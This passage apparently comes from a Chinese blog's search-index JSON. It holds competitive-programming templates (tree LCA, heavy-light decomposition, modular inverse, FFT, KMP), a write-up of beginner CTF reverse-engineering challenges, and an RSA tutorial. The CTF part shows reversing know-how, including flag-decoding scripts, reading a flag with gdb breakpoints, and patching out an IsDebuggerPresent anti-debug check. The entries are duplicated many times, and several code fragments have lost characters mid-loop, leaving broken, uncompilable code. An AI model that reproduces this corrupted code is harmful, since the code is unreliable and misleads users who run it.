fa[a][0]; } for(int j=1;j\u003c=19;j++) for(int i=1;i\u003c=n;i++) fa[i][j]=fa[fa[i][j-1]][j-1]; 树链剖分寻找重儿子 void dfs(int x,int f,int d){ dep[x]=d;fa[x]=f;sz[x]=1;son[x]=0; for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to; if(u==f)continue; dfs(u,x,d+1); if(sz[u]\u003esz[son[x]])son[x]=u; sz[x]+=sz[u]; } } 处理top void dfs_top(int x,int tp){ top[x]=tp;ID[x]=++tt;ln[tt]=x; if(son[x])dfs_top(son[x],tp); for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to; if(u==son[x]||u==fa[x])continue; dfs_top(u,u); } } query while(top[u]!=top[v]){ if(dep[top[u]]\u003edep[top[v]]){ query(ID[top[u]],ID[u],1); u=fa[top[u]]; } else { query(ID[top[v]],ID[v],1); v=fa[top[v]]; } } if(dep[u]\u003edep[v])query(ID[v],ID[u],1); else query(ID[u],ID[v],1); ","date":"2022-05-20","objectID":"/articles/templates/:0:4","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#lca"},{"categories":null,"content":" 树上算法 LCA跳重链 void dfs(int x,int f,int d){ dep[x]=d; sz[x]=1; fa[x]=f;son[x]=0; for(int i=0;isz[son[x]])son[x]=u; sz[x]+=sz[u]; } } void dfs_top(int x,int tp){ top[x]=tp; if(son[x])dfs_top(son[x],tp); for(int i=0;idep[top[b]])a=fa[top[a]]; else b=fa[top[b]]; } return dep[a]\u003edep[b]?b:a; } 倍增 void dfs(int x,int f,int d){ dep[x]=d; fa[x][0]=f; for(int i=0;idep[b])swap(a,b); int step=dep[b]-dep[a]; for(int i=19;i\u003e=0;i--) if(step\u00261\u003c=0;i--) if(fa[a][i]!=fa[b][i])a=fa[a][i],b=fa[b][i]; return fa[a][0]; } for(int j=1;j\u003c=19;j++) for(int i=1;i\u003c=n;i++) fa[i][j]=fa[fa[i][j-1]][j-1]; 树链剖分寻找重儿子 void dfs(int x,int f,int d){ dep[x]=d;fa[x]=f;sz[x]=1;son[x]=0; for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to; if(u==f)continue; dfs(u,x,d+1); if(sz[u]\u003esz[son[x]])son[x]=u; sz[x]+=sz[u]; } } 处理top void dfs_top(int x,int tp){ top[x]=tp;ID[x]=++tt;ln[tt]=x; if(son[x])dfs_top(son[x],tp); for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to; if(u==son[x]||u==fa[x])continue; dfs_top(u,u); } } query while(top[u]!=top[v]){ if(dep[top[u]]\u003edep[top[v]]){ query(ID[top[u]],ID[u],1); u=fa[top[u]]; } else { query(ID[top[v]],ID[v],1); v=fa[top[v]]; } } if(dep[u]\u003edep[v])query(ID[v],ID[u],1); else query(ID[u],ID[v],1); ","date":"2022-05-20","objectID":"/articles/templates/:0:4","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#树链剖分"},{"categories":null,"content":" 数学 扩展欧几里得算法 void exgcd(ll a,ll b,ll \u0026d,ll \u0026x,ll \u0026y){ if(!b){d=a;x=1;y=0;return;} exgcd(b,a%b,d,y,x);y-=a/b*x; } 逆元 int inv(int a){ ll x,y,d; exgcd(a,m,d,x,y); return (x%MOD+MOD)%MOD; } //当a与mod互质时也可使用费马小定理，qkpow(a,mod-2) int qkpow(int a,int b){ int res=1; while(b){ if(b\u00261)res=res*a%mod; a=a*a%mod; b\u003e\u003e=1; } return res; } //注意不要爆int或者long long 线性筛逆元 void Init(){ fac[0]=1;rev[1]=1; for(int i=1;i\u003c=n;i++) fac[i]=(fac[i-1]*i)%MOD; for(int i=2;i\u003c=n;i++)//线性筛逆元 rev[i]=(MOD-MOD/i)*rev[MOD%i]%MOD; } FFT struct Complex{ double x,y; Complex(){} Complex(double _x,double _y):x(_x),y(_y){} Complex operator + (const Complex \u0026res) const{ return (Complex){x+res.x,y+res.y}; } Complex operator - (const Complex \u0026res) const{ return (Complex){x-res.x,y-res.y}; } Complex operator * (const Complex \u0026res) const{ return (Complex){x*res.x-y*res.y,x*res.y+y*res.x}; } }; Complex A[M],B[M]; double pi=acos(-1.0); void FFT(Complex *y,int n,int f){ if(n==1)return; Complex L[n\u003e\u003e1],R[n\u003e\u003e1]; for(int i=0;i\u003cn;i+=2)L[i\u003e\u003e1]=y[i],R[i\u003e\u003e1]=y[i+1]; FFT(L,n\u003e\u003e1,f);FFT(R,n\u003e\u003e1,f); Complex wn(cos(2*pi/n),f*sin(2*pi/n)),w(1,0); for(int i=0;i\u003c(n\u003e\u003e1);i++,w=w*wn){ y[i]=L[i]+w*R[i]; y[i+(n\u003e\u003e1)]=L[i]-w*R[i]; } } double q[M],b[M],C[M]; int main(){ //... int nn=n,mm=n; mm+=nn; for(nn=1;nn\u003c=mm;nn\u003c\u003c=1); FFT(A,nn,1);FFT(B,nn,1); for(int i=0;i\u003c=nn;i++)A[i]=A[i]*B[i]; FFT(A,nn,-1); //... } ","date":"2022-05-20","objectID":"/articles/templates/:0:5","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#数学"},{"categories":null,"content":" 数学 扩展欧几里得算法 void exgcd(ll a,ll b,ll \u0026d,ll \u0026x,ll \u0026y){ if(!b){d=a;x=1;y=0;return;} exgcd(b,a%b,d,y,x);y-=a/b*x; } 逆元 int inv(int a){ ll x,y,d; exgcd(a,m,d,x,y); return (x%MOD+MOD)%MOD; } //当a与mod互质时也可使用费马小定理，qkpow(a,mod-2) int qkpow(int a,int b){ int res=1; while(b){ if(b\u00261)res=res*a%mod; a=a*a%mod; b\u003e\u003e=1; } return res; } //注意不要爆int或者long long 线性筛逆元 void Init(){ fac[0]=1;rev[1]=1; for(int i=1;i\u003c=n;i++) fac[i]=(fac[i-1]*i)%MOD; for(int i=2;i\u003c=n;i++)//线性筛逆元 rev[i]=(MOD-MOD/i)*rev[MOD%i]%MOD; } FFT struct Complex{ double x,y; Complex(){} Complex(double _x,double _y):x(_x),y(_y){} Complex operator + (const Complex \u0026res) const{ return (Complex){x+res.x,y+res.y}; } Complex operator - (const Complex \u0026res) const{ return (Complex){x-res.x,y-res.y}; } Complex operator * (const Complex \u0026res) const{ return (Complex){x*res.x-y*res.y,x*res.y+y*res.x}; } }; Complex A[M],B[M]; double pi=acos(-1.0); void FFT(Complex *y,int n,int f){ if(n==1)return; Complex L[n\u003e\u003e1],R[n\u003e\u003e1]; for(int i=0;i\u003e1]=y[i],R[i\u003e\u003e1]=y[i+1]; FFT(L,n\u003e\u003e1,f);FFT(R,n\u003e\u003e1,f); Complex wn(cos(2*pi/n),f*sin(2*pi/n)),w(1,0); for(int i=0;i\u003c(n\u003e\u003e1);i++,w=w*wn){ y[i]=L[i]+w*R[i]; y[i+(n\u003e\u003e1)]=L[i]-w*R[i]; } } double q[M],b[M],C[M]; int main(){ //... int nn=n,mm=n; mm+=nn; for(nn=1;nn\u003c=mm;nn\u003c\u003c=1); FFT(A,nn,1);FFT(B,nn,1); for(int i=0;i\u003c=nn;i++)A[i]=A[i]*B[i]; FFT(A,nn,-1); //... } ","date":"2022-05-20","objectID":"/articles/templates/:0:5","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#扩展欧几里得算法"},{"categories":null,"content":" 数学 扩展欧几里得算法 void exgcd(ll a,ll b,ll \u0026d,ll \u0026x,ll \u0026y){ if(!b){d=a;x=1;y=0;return;} exgcd(b,a%b,d,y,x);y-=a/b*x; } 逆元 int inv(int a){ ll x,y,d; exgcd(a,m,d,x,y); return (x%MOD+MOD)%MOD; } //当a与mod互质时也可使用费马小定理，qkpow(a,mod-2) int qkpow(int a,int b){ int res=1; while(b){ if(b\u00261)res=res*a%mod; a=a*a%mod; b\u003e\u003e=1; } return res; } //注意不要爆int或者long long 线性筛逆元 void Init(){ fac[0]=1;rev[1]=1; for(int i=1;i\u003c=n;i++) fac[i]=(fac[i-1]*i)%MOD; for(int i=2;i\u003c=n;i++)//线性筛逆元 rev[i]=(MOD-MOD/i)*rev[MOD%i]%MOD; } FFT struct Complex{ double x,y; Complex(){} Complex(double _x,double _y):x(_x),y(_y){} Complex operator + (const Complex \u0026res) const{ return (Complex){x+res.x,y+res.y}; } Complex operator - (const Complex \u0026res) const{ return (Complex){x-res.x,y-res.y}; } Complex operator * (const Complex \u0026res) const{ return (Complex){x*res.x-y*res.y,x*res.y+y*res.x}; } }; Complex A[M],B[M]; double pi=acos(-1.0); void FFT(Complex *y,int n,int f){ if(n==1)return; Complex L[n\u003e\u003e1],R[n\u003e\u003e1]; for(int i=0;i\u003e1]=y[i],R[i\u003e\u003e1]=y[i+1]; FFT(L,n\u003e\u003e1,f);FFT(R,n\u003e\u003e1,f); Complex wn(cos(2*pi/n),f*sin(2*pi/n)),w(1,0); for(int i=0;i\u003c(n\u003e\u003e1);i++,w=w*wn){ y[i]=L[i]+w*R[i]; y[i+(n\u003e\u003e1)]=L[i]-w*R[i]; } } double q[M],b[M],C[M]; int main(){ //... int nn=n,mm=n; mm+=nn; for(nn=1;nn\u003c=mm;nn\u003c\u003c=1); FFT(A,nn,1);FFT(B,nn,1); for(int i=0;i\u003c=nn;i++)A[i]=A[i]*B[i]; FFT(A,nn,-1); //... } ","date":"2022-05-20","objectID":"/articles/templates/:0:5","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#逆元"},{"categories":null,"content":" 数学 扩展欧几里得算法 void exgcd(ll a,ll b,ll \u0026d,ll \u0026x,ll \u0026y){ if(!b){d=a;x=1;y=0;return;} exgcd(b,a%b,d,y,x);y-=a/b*x; } 逆元 int inv(int a){ ll x,y,d; exgcd(a,m,d,x,y); return (x%MOD+MOD)%MOD; } //当a与mod互质时也可使用费马小定理，qkpow(a,mod-2) int qkpow(int a,int b){ int res=1; while(b){ if(b\u00261)res=res*a%mod; a=a*a%mod; b\u003e\u003e=1; } return res; } //注意不要爆int或者long long 线性筛逆元 void Init(){ fac[0]=1;rev[1]=1; for(int i=1;i\u003c=n;i++) fac[i]=(fac[i-1]*i)%MOD; for(int i=2;i\u003c=n;i++)//线性筛逆元 rev[i]=(MOD-MOD/i)*rev[MOD%i]%MOD; } FFT struct Complex{ double x,y; Complex(){} Complex(double _x,double _y):x(_x),y(_y){} Complex operator + (const Complex \u0026res) const{ return (Complex){x+res.x,y+res.y}; } Complex operator - (const Complex \u0026res) const{ return (Complex){x-res.x,y-res.y}; } Complex operator * (const Complex \u0026res) const{ return (Complex){x*res.x-y*res.y,x*res.y+y*res.x}; } }; Complex A[M],B[M]; double pi=acos(-1.0); void FFT(Complex *y,int n,int f){ if(n==1)return; Complex L[n\u003e\u003e1],R[n\u003e\u003e1]; for(int i=0;i\u003e1]=y[i],R[i\u003e\u003e1]=y[i+1]; FFT(L,n\u003e\u003e1,f);FFT(R,n\u003e\u003e1,f); Complex wn(cos(2*pi/n),f*sin(2*pi/n)),w(1,0); for(int i=0;i\u003c(n\u003e\u003e1);i++,w=w*wn){ y[i]=L[i]+w*R[i]; y[i+(n\u003e\u003e1)]=L[i]-w*R[i]; } } double q[M],b[M],C[M]; int main(){ //... int nn=n,mm=n; mm+=nn; for(nn=1;nn\u003c=mm;nn\u003c\u003c=1); FFT(A,nn,1);FFT(B,nn,1); for(int i=0;i\u003c=nn;i++)A[i]=A[i]*B[i]; FFT(A,nn,-1); //... } ","date":"2022-05-20","objectID":"/articles/templates/:0:5","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#线性筛逆元"},{"categories":null,"content":" 数学 扩展欧几里得算法 void exgcd(ll a,ll b,ll \u0026d,ll \u0026x,ll \u0026y){ if(!b){d=a;x=1;y=0;return;} exgcd(b,a%b,d,y,x);y-=a/b*x; } 逆元 int inv(int a){ ll x,y,d; exgcd(a,m,d,x,y); return (x%MOD+MOD)%MOD; } //当a与mod互质时也可使用费马小定理，qkpow(a,mod-2) int qkpow(int a,int b){ int res=1; while(b){ if(b\u00261)res=res*a%mod; a=a*a%mod; b\u003e\u003e=1; } return res; } //注意不要爆int或者long long 线性筛逆元 void Init(){ fac[0]=1;rev[1]=1; for(int i=1;i\u003c=n;i++) fac[i]=(fac[i-1]*i)%MOD; for(int i=2;i\u003c=n;i++)//线性筛逆元 rev[i]=(MOD-MOD/i)*rev[MOD%i]%MOD; } FFT struct Complex{ double x,y; Complex(){} Complex(double _x,double _y):x(_x),y(_y){} Complex operator + (const Complex \u0026res) const{ return (Complex){x+res.x,y+res.y}; } Complex operator - (const Complex \u0026res) const{ return (Complex){x-res.x,y-res.y}; } Complex operator * (const Complex \u0026res) const{ return (Complex){x*res.x-y*res.y,x*res.y+y*res.x}; } }; Complex A[M],B[M]; double pi=acos(-1.0); void FFT(Complex *y,int n,int f){ if(n==1)return; Complex L[n\u003e\u003e1],R[n\u003e\u003e1]; for(int i=0;i\u003e1]=y[i],R[i\u003e\u003e1]=y[i+1]; FFT(L,n\u003e\u003e1,f);FFT(R,n\u003e\u003e1,f); Complex wn(cos(2*pi/n),f*sin(2*pi/n)),w(1,0); for(int i=0;i\u003c(n\u003e\u003e1);i++,w=w*wn){ y[i]=L[i]+w*R[i]; y[i+(n\u003e\u003e1)]=L[i]-w*R[i]; } } double q[M],b[M],C[M]; int main(){ //... int nn=n,mm=n; mm+=nn; for(nn=1;nn\u003c=mm;nn\u003c\u003c=1); FFT(A,nn,1);FFT(B,nn,1); for(int i=0;i\u003c=nn;i++)A[i]=A[i]*B[i]; FFT(A,nn,-1); //... } ","date":"2022-05-20","objectID":"/articles/templates/:0:5","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#fft"},{"categories":null,"content":" 字符串算法 KMP给出两个字符串S1和S2，若S1的区间[l,r]与S2完全相同，则称S2在S1中出现了，其出现位置为l。 现在请你求出S2在S1中所有出现的位置。 定义一个字符串S的border为S的一个非S本身的子串t，满足t既是S的前缀，又是S的后缀。 对于S2，你还需要求出对于每个前缀S’的最长border t‘的长度。 #include\u003cbits/stdc++.h\u003e #define M 1000005 using namespace std; char s1[M],s2[M]; int f[M]; void getf(char *s,int l){ f[0]=f[1]=0; for(int i=1;i\u003cl;i++){ int j=f[i]; while(j\u0026\u0026s[i]!=s[j])j=f[j]; if(s[i]==s[j])j++; f[i+1]=j; } } int main(){ scanf(\"%s%s\",s1,s2); int l1=strlen(s1); int l2=strlen(s2); getf(s2,l2); for(int i=0,j=0;i\u003cl1;i++){ while(j\u0026\u0026s2[j]!=s1[i])j=f[j]; if(s2[j]==s1[i])j++; if(j==l2) printf(\"%d\\n\",i-l2+2); } for(int i=1;i\u003c=l2;i++) printf(\"%d \",f[i]); return 0; } ","date":"2022-05-20","objectID":"/articles/templates/:0:6","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#字符串算法"},{"categories":null,"content":" 字符串算法 KMP给出两个字符串S1和S2，若S1的区间[l,r]与S2完全相同，则称S2在S1中出现了，其出现位置为l。 现在请你求出S2在S1中所有出现的位置。 定义一个字符串S的border为S的一个非S本身的子串t，满足t既是S的前缀，又是S的后缀。 对于S2，你还需要求出对于每个前缀S’的最长border t‘的长度。 #include #define M 1000005 using namespace std; char s1[M],s2[M]; int f[M]; void getf(char *s,int l){ f[0]=f[1]=0; for(int i=1;i","date":"2022-05-20","objectID":"/articles/templates/:0:6","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#kmp"},{"categories":["CTF","CTF-reverse"],"content":" 0x00. simple-unpack使用exeinfope脱壳，拖进IDA shift+F12搜索字符串。 ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:1","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x00-simple-unpack"},{"categories":["CTF","CTF-reverse"],"content":" 0x01. logmein反编译得到如下代码： void __fastcall __noreturn main(int a1, char **a2, char **a3) { size_t v3; // rsi int i; // [rsp+3Ch] [rbp-54h] char s[36]; // [rsp+40h] [rbp-50h] BYREF int v6; // [rsp+64h] [rbp-2Ch] __int64 v7; // [rsp+68h] [rbp-28h] char v8[28]; // [rsp+70h] [rbp-20h] BYREF int v9; // [rsp+8Ch] [rbp-4h] v9 = 0; strcpy(v8, \":\\\"AL_RT^L*.?+6/46\"); v7 = 0x65626D61726168LL; v6 = 7; printf(\"Welcome to the RC3 secure password guesser.\\n\"); printf(\"To continue, you must enter the correct password.\\n\"); printf(\"Enter your guess: \"); __isoc99_scanf(); v3 = strlen(s); if ( v3 \u003c strlen(v8) ) sub_4007C0(); for ( i = 0; i \u003c strlen(s); ++i ) { if ( i \u003e= strlen(v8) ) sub_4007C0(); if ( s[i] != (char)(*((_BYTE *)\u0026v7 + i % v6) ^ v8[i]) ) sub_4007C0(); } sub_4007F0(); } 可以看出，flag就是v7，v6，v8经过一定规则生成的字符串，提取出生成flag的逻辑，写成脚本如下： v8=\":\\\"AL_RT^L*.?+6/46\" v7 = 'ebmarah'[::-1] s='' for i in range(len(v8)): s+=chr(ord(v7[i%7])^ord(v8[i])) print(s) ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:2","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x01-logmein"},{"categories":["CTF","CTF-reverse"],"content":" 0x02. insanity直接拖进IDA，查找字符串。 ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:3","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x02-insanity"},{"categories":["CTF","CTF-reverse"],"content":" 0x03. python-trade反编译之后发现有个encode函数，根据函数的逻辑规则写出decode函数如下： import base64 buf = base64.b64decode('XlNkVmtUI1MgXWBZXCFeKY+AaXNt') flag = '' for i in buf: i -= 16 i ^= 32 flag += chr(i) print(flag) ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:4","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x03-python-trade"},{"categories":["CTF","CTF-reverse"],"content":" 0x04. re1又一个直接查找字符串就能找到flag的题。 ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:5","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x04-re1"},{"categories":["CTF","CTF-reverse"],"content":" 0x05. game打开是个游戏，游戏通关拿到flag（草） ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:6","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x05-game"},{"categories":["CTF","CTF-reverse"],"content":" 0x06. Hello, CTF反编译获得如下代码： int __cdecl main(int argc, const char **argv, const char **envp) { int i; // ebx char v4; // al int result; // eax char Buffer[2]; // [esp+12h] [ebp-5Eh] BYREF char v7[20]; // [esp+14h] [ebp-5Ch] BYREF char v8[32]; // [esp+28h] [ebp-48h] BYREF __int16 v9; // [esp+48h] [ebp-28h] char v10; // [esp+4Ah] [ebp-26h] char v11[36]; // [esp+4Ch] [ebp-24h] BYREF strcpy(v11, \"437261636b4d654a757374466f7246756e\"); while ( 1 ) { memset(v8, 0, sizeof(v8)); v9 = 0; v10 = 0; printf(aPleaseInputYou); scanf(\"%s\", v7); if ( strlen(v7) \u003e 0x11 ) break; for ( i = 0; i \u003c 17; ++i ) { v4 = v7[i]; if ( !v4 ) break; sprintf(Buffer, \"%x\", v4); strcat(v8, Buffer); } if ( !strcmp(v8, v11) ) printf(\"success!\\n\"); else printf(\"wrong!\\n\"); } printf(\"wrong!\\n\"); result = --Stream._cnt; if ( Stream._cnt \u003c 0 ) return _filbuf(\u0026Stream); ++Stream._ptr; return result; } 阅读代码后发现就是将输入的字符串转换为16进制存储，再与给定字符串比较。 因此可以根据给定字符串推导出flag。 ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:7","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x06-hello-ctf"},{"categories":["CTF","CTF-reverse"],"content":" 0x07. open-source题目直接给出了源代码： #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int main(int argc, char *argv[]) { if (argc != 4) { printf(\"what?\\n\"); exit(1); } unsigned int first = atoi(argv[1]); if (first != 0xcafe) { printf(\"you are wrong, sorry.\\n\"); exit(2); } unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) { printf(\"ha, you won't get it!\\n\"); exit(3); } if (strcmp(\"h4cky0u\", argv[3])) { printf(\"so close, dude!\\n\"); exit(4); } printf(\"Brr wrrr grr\\n\"); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(\"Get your key: \"); printf(\"%x\\n\", hash); return 0; } 根据规则构造payload即可获取flag。 ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:8","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x07-open-source"},{"categories":["CTF","CTF-reverse"],"content":" 0x08. no-strings-attached打开来发现是一个非常大的程序： 注意到最后一个函数authenticate可能是验证输入的flag是否正确，打开后如下： 看样子是要比较ws和s2的值是否一致，而s2是由decrypt函数生成的： 生成flag的算法看起来挺复杂，懒得写了，故采用动态调试。阅读汇编代码可知，decrypt函数结束后，返回值存在eax中。 用gdb再decrypt函数处下个断点，程序运行至decrypt处停下，再往前运行一步，再结束运行此函数，此时eax寄存器存储的值就是flag。 (gdb)b decrypt (gdb)n (gdb)finish (gdb)x/6sw $eax ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:9","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x08-no-strings-attached"},{"categories":["CTF","CTF-reverse"],"content":" 0x09. csaw2013reversing2打开来发现有一个窗体，弹出了一坨乱码： 打开IDA查看程序逻辑： 发现程序存在反调试IsDebuggerPresent。 跳过反调试，将jnz short loc_401096改为jmp short loc_401096，绕过反调试检查。 再将int 3 ;Trap to Debugger改为nop去掉这个中断。 再跳转回原来的弹窗输出flag。 Patch Program的方法：Edit-\u003ePatch Program-\u003eAssemble 全部更改完成后，点击Edit-\u003ePatch Program-\u003eApply patches to input file ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:10","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x09-csaw2013reversing2"},{"categories":["CTF","CTF-reverse"],"content":" 0x0a. getit拖进IDA看见如下代码： 分析逻辑之后发现t的值就是flag，可以直接根据逻辑写exp，不过我这里使用动态调试的方法。 在for循环的第一个函数处下个断点，之后直接查看t的值。 (gdb)b fseek (gdb)r (gdb)x/6 0x6010e0#t的地址 成功获取flag。 ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:11","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x0a-getit"},{"categories":["CTF","CTF-reverse"],"content":" 0x0b. mazeXCTF reverse maze - YenKoc - 博客园 (cnblogs.com) ","date":"2022-04-19","objectID":"/articles/reverse-exercise-area/:0:12","series":null,"tags":null,"title":"攻防世界reverse练习区WP","uri":"/articles/reverse-exercise-area/#0x0b-maze"},{"categories":["CTF","CTF-Crypto"],"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1\u003ce\u003c\\phi{(n)}\\)，且\\(e\\)与\\(\\phi{(n)}\\)互质 生成私钥 \\(d\\)，满足\\(ed\\equiv1(mod\\ \\phi{(n)})\\) 假设要发送的信息为\\(m\\)，则加解密规则成立： $$ m^e\\equiv c\\pmod{n}\\\\ c^d\\equiv m\\pmod{n} $$ 可靠性分析考虑甲向乙发送一串数据，乙只需要向甲传送\\(n\\)和\\(e\\),甲就可以将加密完成的\\(c\\)发还给乙，由乙来进行解密操作。 考虑第三方攻击者，只可能截获\\(n\\),\\(e\\),\\(c\\)，若要获取私钥\\(d\\)，则必须计算得\\(n\\)分解成的\\(p\\),\\(q\\)两数。 而大质数的因式分解所需要的运算量是非常恐怖的。因此，当选定的\\(n\\)很大时，RSA算法几乎不可能被破解。 总而言之：RSA利用的是，大数容易相乘，难以分解的特性，使得算法可靠。 代码实现 #RSA加解密算法实现 @copyright zeroy p=1000000007 q=998244353 n=p*q phi_n=(p-1)*(q-1) E=65537 def qkpow(a,b): ans=1 while b\u003e0: if b%2==1: ans=ans*a%n a=a*a%n b=b//2 return ans def exgcd(a,b): if b==0: return 1,0,a else: x,y,q=exgcd(b,a%b) x,y=y,(x-(a//b)*y) return x,y,q # E**D=1(mod phi_n) def calcD(): x,y,q=exgcd(E,phi_n) return x+phi_n D=calcD() # C=m**E%n def encode(m): c=qkpow(m,E) return c # ans=c**D%n def decode(c): return qkpow(c,D) def main(): c=encode(234234) ans=decode(c) print(ans) main() 正确性证明RSA算法过程以及正确性证明 - 简书 (jianshu.com) 拓展知识我们已经知道了RSA算法的流程，也知道了它的正确性，但是还有几个问题需要解决。 既然大数分解十分困难，那我们该如何寻找两个大质数来作为\\(p\\),\\(q\\)呢？ 加解密运算中涉及到了大量的大数乘法取模，这是运算复杂度最高的部分，有没有一种方法可以优化\\(AB\\equiv C(mod\\ N)\\)运算的速度从而优化密钥生成的速度？ 方法是有的。可以采用Miller Rabin算法来对生成的大数进行质数检验，用蒙哥马利算法来优化大数相乘的复杂度，不过这不属于本文的主题，感兴趣的师傅可以自行了解。 ","date":"2022-03-31","objectID":"/articles/basic_RSA/:0:0","series":null,"tags":null,"title":"RSA算法详解","uri":"/articles/basic_RSA/#"},{"categories":["CTF","CTF-Crypto"],"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"2022-03-31","objectID":"/articles/basic_RSA/:0:0","series":null,"tags":null,"title":"RSA算法详解","uri":"/articles/basic_RSA/#引入"},{"categories":["CTF","CTF-Crypto"],"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"2022-03-31","objectID":"/articles/basic_RSA/:0:0","series":null,"tags":null,"title":"RSA算法详解","uri":"/articles/basic_RSA/#算法流程"},{"categories":["CTF","CTF-Crypto"],"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"2022-03-31","objectID":"/articles/basic_RSA/:0:0","series":null,"tags":null,"title":"RSA算法详解","uri":"/articles/basic_RSA/#可靠性分析"},{"categories":["CTF","CTF-Crypto"],"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"2022-03-31","objectID":"/articles/basic_RSA/:0:0","series":null,"tags":null,"title":"RSA算法详解","uri":"/articles/basic_RSA/#代码实现"},{"categories":["CTF","CTF-Crypto"],"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 